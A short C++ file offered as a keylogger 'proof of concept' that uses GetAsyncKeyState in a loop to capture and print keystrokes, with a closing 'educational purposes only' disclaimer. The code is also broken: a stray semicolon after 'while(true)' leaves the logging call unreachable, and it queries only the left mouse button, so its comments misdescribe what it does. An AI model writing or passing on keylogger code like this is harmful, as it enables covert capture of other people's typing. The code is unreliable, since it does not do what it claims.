#include <iostream>
#include <windows.h>
#include <winuser.h>

using namespace std;

// global variable to store keystroke

char key;

// function to log the keystrokes

void logKeystroke()
{
    // get the keystroke using the GetAsyncKeyState() function
    
    key = GetAsyncKeyState(VK_LBUTTON);
    
    // print the keystroke
    cout << key;
}

int main()
{
    // infinite loop to log the keystrokes
    while(true);
    {
        // call the logKeyStroke() function
        logKeystroke();
    }
return 0;
}

// Please note that this is a proof of concept for educational purposes only. Not to be used in a production environment, USE ONLY IN A SANDBOX.